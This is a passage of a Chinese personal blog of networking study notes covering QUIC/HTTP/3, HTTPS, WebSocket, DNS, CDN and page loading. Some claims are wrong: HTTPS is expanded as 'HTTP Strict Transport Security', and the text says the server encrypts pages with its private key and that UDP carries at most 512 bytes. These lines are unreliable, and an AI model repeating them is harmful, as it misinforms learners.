<p><strong>网络迁移需要重新连接</strong><br>一个 TCP 连接是由四元组（源 IP 地址，源端口，目标 IP 地址，目标端口）确定的，这意味着如果 IP 地址或者端口变动了，就会导致需要 TCP 与 TLS 重新握手，这不利于移动设备切换网络的场景，比如 4G 网络环境切换成 WIFI。<br><strong>​</strong></p>
<h3 id="HTTP-3-0-QUIC（Quick-UDP-Internet-Connection）"><a href="#HTTP-3-0-QUIC（Quick-UDP-Internet-Connection）" class="headerlink" title="HTTP/3.0 - QUIC（Quick UDP Internet Connection）"></a>HTTP/3.0 - QUIC（Quick UDP Internet Connection）</h3><p>UDP 是一个简单、不可靠的传输协议，而且是 UDP 包之间是无序的，也没有依赖关系。，UDP 是不需要连接的，也就不需要握手和挥手的过程，所以天然的就比 TCP 快。<br>QUIC 协议具有类似 TCP 的连接管理、拥塞窗口、流量控制的网络特性，相当于将不可靠传输的 UDP 协议变成“可靠”的。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629965824844-e7ab703c-97db-485a-9e1a-fb4f45a07c86.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ub66249ff&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=1727&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=374351&status=done&style=none&taskId=u372bf66c-d9a6-4421-a0a9-ae5b1d7eec9&title=" alt="image.png"></p>
<h4 id="无队头阻塞"><a href="#无队头阻塞" class="headerlink" title="无队头阻塞"></a>无队头阻塞</h4><p>QUIC 协议也有类似 HTTP/2 Stream 与多路复用的概念，也是可以在同一条连接上并发传输多个 Stream，Stream 可以认为就是一条 HTTP 请求。每个数据包都有一个序号唯一标识。当某个流中的一个数据包丢失了，即使该流的其他数据包到达了，数据也无法被 HTTP/3 读取，直到 QUIC 重传丢失的报文，数据才会交给 HTTP/3。<br>而其他流的数据报文只要被完整接收，HTTP/3 就可以读取到数据。QUIC 连接上的多个 Stream 之间并没有依赖，都是独立的，某个流发生丢包了，只会影响该流，其他流不受影响。<br>​</p>
<h4 id="更快的连接建立"><a href="#更快的连接建立" class="headerlink" title="更快的连接建立"></a>更快的连接建立</h4><p>对于 HTTP/1 和 HTTP/2 协议，TCP 和 TLS 是分层的，分别属于内核实现的传输层、openssl 库实现的表示层，因此它们难以合并在一起，需要分批次来握手，先 TCP 握手，再 TLS 握手。<br>HTTP/3 在传输数据前虽然需要 QUIC 协议握手，这个握手过程只需要 1 RTT，握手的目的是为确认双方的「连接 ID」，连接迁移就是基于连接 ID 实现的。但是 HTTP/3 的 QUIC 协议并不是与 TLS 分层，而是<strong>QUIC 内部包含了 TLS</strong>，它在自己的帧会携带 TLS 里的“记录”，再加上 QUIC 使用的是 TLS1.3，因此仅需 1 个 RTT 就可以「同时」完成建立连接与密钥协商，甚至在第二次连接的时候，应用数据包可以和 QUIC 握手信息（连接信息 + TLS 信息）一起发送，达到 0-RTT 的效果。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629966358376-8c844f35-47a0-4545-b760-5a69883797fa.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=323&id=u836d382b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=740&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=135064&status=done&style=none&taskId=ub6296883-36ed-45ca-814f-4e99f0abcca&title=&width=740" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629965882538-6ecca185-afec-40f6-b64b-8bdcaea639fc.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u18ebdbb6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=720&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=113227&status=done&style=none&taskId=u8c933992-6a18-47e3-b254-39c09f115c0&title=" alt="image.png"><br>QUIC 实现 0 RTT 的一个技术细节是使用了 DH 密钥交换算法。结合下图 可以更好地理解上面的过程。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629966168164-16ad67cc-9fd8-4f5a-acc4-edd11072f542.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=302&id=ue7db7154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=302&originWidth=474&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=54726&status=done&style=none&taskId=u91570a41-a819-413d-b049-925a0ce1303&title=&width=474" alt="image.png"><br>DH 算法的核心就是服务端生成 a、g、p 3 个随机数，a 自己持有，g 和 p 要传输给客户端，而客户端会生成 b 这 1 个随机数，通过 DH 算法客户端和服务端可以算出同样的密钥。在这过程中 a 和 b 并不参与网络传输，安全性大大提高。因为 p 和 g 是大数，所以即使在网络中传输的 p、g、A、B 都被劫持，那么靠现在的计算机算力也没法破解密钥。<br>​</p>
<h4 id="连接迁移"><a href="#连接迁移" class="headerlink" title="连接迁移"></a>连接迁移</h4><p>QUIC 协议没有用四元组的方式来“绑定”连接，而是通过<strong>连接 ID</strong>来标记通信的两个端点，客户端和服务器可以各自选择一组 ID 来标记自己，因此即使移动设备的网络变化后，导致 IP 地址变化了，只要仍保有上下文信息（比如连接 ID、TLS 密钥等），就可以“无缝”地复用原连接，消除重连的成本，没有丝毫卡顿感，达到了连接迁移的功能。<br>​</p>
<h4 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a>头部压缩</h4><p>HTTP/2 使用的 HPACK，HTTP/3 更换成了兼容 HPACK 的 QPACK 压缩方案。QPACK 优化了对乱序发送的支持，也优化了压缩率。</p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>类似滑动窗口的流量控制和拥塞控制策略<br>​</p>
<h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><p>普及最大的挑战来自于互联网上现存的网络设备无法识别 QUIC。</p>
<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTPS （HTTP Strict Transport Security）称为安全的超文本传输协议，在 HTTP 与 TCP 之间增加了一层安全链路 (SSL/TLS)，使用混合的加密机制，使用非对称密钥加密用于传输对称密钥来保证传输过程的安全性，之后使用对称密钥加密进行通信来保证通信过程的效率。<br>​</p>
<h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><ul>
<li>窃听风险（eavesdropping）使用明文进行通信，内容可能会被窃听； –&gt; 加密传播 –&gt; 对称密钥</li>
<li>冒充风险（pretending）不验证通信方的身份，通信方的身份有可能遭遇伪装； –&gt;身份证书 –&gt; 数字证书</li>
<li>篡改风险（tampering）无法证明报文的完整性，报文有可能遭篡改。 –&gt; 校验机制</li>
</ul>
<p><img src="https://github.com/CatcherInSky/CatcherInSky.github.io/raw/source/source/images/HTTPS-HTTP-TLS-SSL.png#crop=0&crop=0&crop=1&crop=1&from=url&id=KdwAi&margin=%5Bobject%20Object%5D&originHeight=302&originWidth=534&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h4 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h4><p>摘要算法是不可逆算法，无法用于数据传输<br>对称密钥加密运算快，但无法保证安全将密钥传输给对方<br>非对称加密算法有很高的安全性也是可逆的，但是由于计算非常的耗时<br>​</p>
<h4 id="四次握手过程"><a href="#四次握手过程" class="headerlink" title="四次握手过程"></a>四次握手过程</h4><ul>
<li>首先，客户端向服务器发出加密请求。</li>
<li>服务器用自己的私钥加密网页以后，连同本身的数字证书，一起发送给客户端。</li>
<li>客户端（浏览器）的”证书管理器”，有”受信任的根证书颁发机构”列表。客户端会根据这张列表，查看解开数字证书的公钥是否在列表之内。（<strong>可信机构颁布、域名一致、未过期</strong>）<ul>
<li>如果数字证书记载的网址，与你正在浏览的网址不一致，就说明这张证书可能被冒用，浏览器会发出警告。</li>
<li>如果这张数字证书不是由受信任的机构颁发的，浏览器会发出另一种警告。</li>
</ul>
</li>
<li>如果数字证书是可靠的，客户端就可以使用证书中的服务器公钥，对**对称密钥(**session key)进行加密，然后与服务器交换加密信息。一次 session 一个 session key。</li>
<li>整个握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的 HTTP 协议，只不过用”会话密钥”加密内容。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629967185050-586d54af-3b37-47f2-98a5-377c7d00797e.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u93496a8b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1875&originWidth=720&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=463575&status=done&style=none&taskId=u672de59f-4925-4fb9-a2ad-b266445e08f&title=" alt="image.png"><br>​</p>
<p>​</p>
<h2 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h2><p>socket 起源于 Unix，而 Unix/Linux 基本哲学之一就是“一切皆文件”，都可以用“打开 open –&gt; 读写 write/read –&gt; 关闭 close”模式来操作。我的理解就是 Socket 就是该模式的一个实现，socket 即是一种特殊的文件，一些 socket 函数就是对其进行的操作（读/写 IO、打开、关闭）。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629967818769-e1713f35-d637-417c-acaf-f3988f83738c.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=oQJB9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=845&originWidth=577&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=109366&status=done&style=none&taskId=u4054a29b-8e02-4c57-a22e-30fef8d461d&title=" alt="image.png"><br>说白了 Socket 是应用层与 TCP/IP 协议族通信的中间软件抽象层，它是一组接口。在设计模式中，Socket 其实就是一个<strong>门面模式</strong>，它把复杂的 TCP/IP 协议族隐藏在 Socket 接口后面，对用户来说，一组简单的接口就是全部，让 Socket 去组织数据，以符合指定的协议<br>websocket 是一种全双工应用层协议，与之相反的 http 是半双工，在 http 通信的过程中，一次只能执行一种操作，发送和接受不能同时进行。websocket 握手需要议，建立连接后通信过程使用 websocket 协议。<img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630130902526-b2edbd2f-3c27-40ad-a536-be6d30acb739.png#clientId=u6550f194-680e-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ubb775e05&margin=%5Bobject%20Object%5D&name=image.png&originHeight=475&originWidth=644&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=83677&status=done&style=none&taskId=uc4b6dd4d-e094-4998-9d78-ce778c1ddd5&title=" alt="image.png">借助于 http 协<br>​</p>
<p><strong>WebSocket 技术出现之前，Web 端实现即时通讯的方法有哪些</strong><br>​</p>
<p><strong>定期轮询</strong><br>客户端按照某个时间间隔不断地向服务端发送请求，请求服务端的最新数据然后更新客户端显示。这种方式实际上浪费了大量流量并且对服务端造成了很大压力。<br>​</p>
<p><strong>服务端推送事件 SSE（Server-Sent Event）</strong><br>允许服务端向客户端推送新数据的 HTML5 技术<br>​</p>
<p><strong>Comet 技术</strong></p>
<ul>
<li><strong>基于长轮询的服务端推送技术</strong></li>
</ul>
<p>具体来讲，就是客户端首先给服务端发送一个请求，服务端收到该请求之后如果<strong>数据没有更新则并不立即返回，服务端阻塞请求的返回，直到数据发生了更新或者发生了连接超时</strong>，服务端返回数据之后客户端再次发送同样的请求。但保持连接会消耗资源。</p>
<ul>
<li><strong>基于流式数据传输的长连接</strong></li>
</ul>
<p>通常的做法是在页面中嵌入一个隐藏的 iframe,然后让这个 iframe 的 src 属性指向我们请求的一个服务端地址，并且为了数据更新，我们将页面上数据更新操作封装为一个 js 函数，将函数名当做参数传递到这个地址当中。<br>服务端收到请求后解析地址取出参数（客户端 js 函数调用名），每当有数据更新的时候，返回对客户端函数的调用，并且将要更新的数据以 js 函数的参数填入到返回内容当中，例如返回“<script type="text/javascript">update("data")</script>”这样一个字符串，意味着以 data 为参数调用客户端 update 函数进行客户端 view 更新。<br>可以看到 comet 技术是针对客户端请求服务器响应模型而模拟出的一个服务端推送数据实时更新技术。而且由于浏览器兼容性不能够广泛应用。<br>​</p>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>​</p>
<p>DNS 是一个分布式数据库，提供了主机名和 IP 地址之间相互转换的服务。这里的分布式数据库是指，每个站点只保留它自己的那部分数据。<br><img src="https://camo.githubusercontent.com/5a570852a0baf09c9592f0a08c8476cf3d653b8d673ca47d8f3e65342d5fd81c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62353465656231362d306230652d343834632d626536322d3330366635376334306437372e6a7067#crop=0&crop=0&crop=1&crop=1&from=url&id=mVkFx&margin=%5Bobject%20Object%5D&originHeight=286&originWidth=859&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>DNS 可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53。大多数情况下 DNS 使用 UDP 进行传输，这就要求域名解析器和域名服务器都必须自己处理超时和重传从而保证可靠性。在两种情况下会使用 TCP 进行传输：</p>
<ol>
<li>如果返回的响应超过的 512 字节（UDP 最大只支持 512 字节的数据）。</li>
<li>区域传送（区域传送是主域名服务器向辅助域名服务器传送变化的那部分数据）。</li>
</ol>
<p>​</p>
<p>整体流程：浏览器搜索自身的 DNS 缓存、搜索操作系统的 DNS 缓存、读取本地的 Host 文件和向本地 DNS 服务器进行查询等。</p>
<p>DNS 查询共有两类：递归查询和迭代查询。</p>
<ul>
<li>递归查询是指，当 A 向 B 查询某个域名的 IP 地址时，如果 B 不知道被查询的域名的 IP 地址，那么 B 会替 A 向更上层的服务器发起查询，将查询结果返回 A。</li>
<li>迭代查询是指，当 A 向 B 查询某个域名的 IP 地址时，如果 B 不知道被查询的域名的 IP 地址，B 会告诉 A 下一步应该向哪个服务器查询，由 A 自己去查。</li>
</ul>
<p>一般来说，主机（也就是我们的电脑）向本地域名服务器的查询是递归查询，而本地域名服务器向根域名服务器的查询是迭代查询。<br>​</p>
<h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>CDN（Content delivery networks，内容分发网络），其目的是通过在源服务器和用户之间增加一层新的网络架构，将网站的内容分发到最接近用户的网络“边缘”，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。<br>为了使用户和网站源服务器之间的“距离”最短，CDN 需要在不同的地理位置（PoPs，接入点）存储网站内容的缓存。一般来说，每个 PoP 都包含多个缓存服务器，它们的主要作用是使用户访问到最近的缓存服务器<br>常用的有：图片、视频、音乐、css、js 文件等静态资源</p>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><ol>
<li>检查本地缓存是否过期</li>
<li>首先经过本地的 dns 解析，请求 cname 指向的那台 cdn 专用的 dns 服务器。</li>
<li>dns 服务器返回<strong>全局负载均衡的服务器 ip</strong>给用户</li>
<li>用户请求全局负载均衡服务器，服务器根据 ip 返回<strong>所在区域的负载均衡服务器 ip</strong>给用户</li>
<li>用户请求区域负载均衡服务器，负载均衡服务器根据用户 ip<strong>选择距离近的，并且存在用户所需内容的，负载比较合适的一台缓存服务器 ip</strong>给用户。当没有对应内容的时候，会去上一级缓存服务器去找，直到找到资源所在的源站服务器，并且缓存在缓存服务器中。用户下一次在请求该资源，就可以就近拿缓存了。</li>
</ol>
<p>​</p>
<p>​</p>
<p>​</p>
<h2 id="从输入一个-URL-到页面加载完成的过程"><a href="#从输入一个-URL-到页面加载完成的过程" class="headerlink" title="从输入一个 URL 到页面加载完成的过程"></a>从输入一个 URL 到页面加载完成的过程</h2><ul>
<li><p>DNS 解析:将域名解析成 IP 地址</p>
<ul>
<li>浏览器缓存：浏览器会按照一定的频率缓存 DNS 记录。</li>
<li>操作系统缓存：如果浏览器缓存中找不到需要的 DNS 记录，那就去操作系统中找。</li>
<li>路由缓存：路由器也有 DNS 缓存。</li>
<li>ISP 的 DNS 服务器：ISP 是互联网服务提供商(Internet Service Provider)的简称，ISP 有专门的 DNS 服务器应对 DNS 查询请求。</li>
<li>根服务器：ISP 的 DNS 服务器还找不到的话，它就会向根服务器发出请求，进行递归查询（DNS 服务器先问根域名服务器.com 域名服务器的 IP 地址，然后再问.baidu 域名服务器，依次类推）</li>
</ul>
</li>
<li><p>TCP 连接：TCP 三次握手</p>
</li>
<li><p>发送 HTTP 请求</p>
</li>
<li><p>服务器处理请求并返回 HTTP 报文</p>
</li>
<li><p>浏览器解析渲染页面</p>
<ul>
<li>根据 HTML 解析出 DOM 树<ul>
<li>根据 HTML 的内容，将标签按照结构解析成为 DOM 树，DOM 树解析的过程是一个深度优先遍历。即先构建当前节点的所有子节点，再构建下一个兄弟节点。</li>
<li>在读取 HTML 文档，构建 DOM 树的过程中，若遇到 script 标签，则 DOM 树的构建会暂停，直至脚本执行完毕。</li>
</ul>
</li>
<li>根据 CSS 解析生成 CSS 规则树<ul>
<li>解析 CSS 规则树时 js 执行将暂停，直至 CSS 规则树就绪。</li>
<li>浏览器在 CSS 规则树生成之前不会进行渲染。</li>
</ul>
</li>
<li>结合 DOM 树和 CSS 规则树，生成渲染树<ul>
<li>DOM 树和 CSS 规则树全部准备好了以后，浏览器才会开始构建渲染树。</li>
<li>精简 CSS 并可以加快 CSS 规则树的构建，从而加快页面相应速度。</li>
</ul>
</li>
<li>根据渲染树计算每一个节点的布局<ul>
<li>布局：通过渲染树中渲染对象的信息，计算出每一个渲染对象的位置和尺寸</li>
<li>回流：在布局完成后，发现了某个部分发生了变化影响了布局，那就需要倒回去重新渲染。</li>
</ul>
</li>
<li>根据计算好的信息绘制页面<ul>
<li>绘制阶段，系统会遍历呈现树，并调用呈现器的“paint”方法，将呈现器的内容显示在屏幕上。</li>
<li>重绘：某个元素的背景颜色，文字颜色等，不影响元素周围或内部布局的属性，将只会引起浏览器的重绘。</li>
<li>回流：某个元素的尺寸发生了变化，则需重新计算渲染树，重新渲染。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629969999858-3f4b1e44-b21e-4fb9-8bb4-5b106a7b7458.png#clientId=ud0ba031e-b2e0-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u4cf06dbc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=258&originWidth=752&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&size=93675&status=done&style=none&taskId=ua1a97f2c-41fb-42cc-8574-f51479b31b3&title=" alt="image.png"></p>
<ul>
<li>断开连接：TCP 四次挥手</li>
</ul>
<p>​</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://imageslr.com/2020/07/07/protocol-stack.html">https://imageslr.com/2020/07/07/protocol-stack.html</a><br><a target="_blank" rel="noopener" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%9B%AE%E5%BD%95.md">https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%9B%AE%E5%BD%95.md</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25028045">https://zhuanlan.zhihu.com/p/25028045</a><br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/28586791">https://www.zhihu.com/question/28586791</a><br><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp">https://www.w3school.com.cn/tags/html_ref_httpmethods.asp</a><br><a target="_blank" rel="noopener" href="https://imageslr.com/2020/07/07/tcp-shake-wave.html">https://imageslr.com/2020/07/07/tcp-shake-wave.html</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/67858932">https://zhuanlan.zhihu.com/p/67858932</a><br><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html">http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/straight/articles/7660889.html">https://www.cnblogs.com/straight/articles/7660889.html</a><br><a target="_blank" rel="noopener" href="http://www.52im.net/thread-331-1-1.html">http://www.52im.net/thread-331-1-1.html</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/147571853">https://zhuanlan.zhihu.com/p/147571853</a><br>​</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="CatcherInSky"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">CatcherInSky</p>
  <div class="site-description" itemprop="description">CatcherInSky的前端知识库</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">42</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/CatcherInSky" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;CatcherInSky" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:zhangchunxiang98@outlook.com" title="E-Mail → mailto:zhangchunxiang98@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CatcherInSky</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
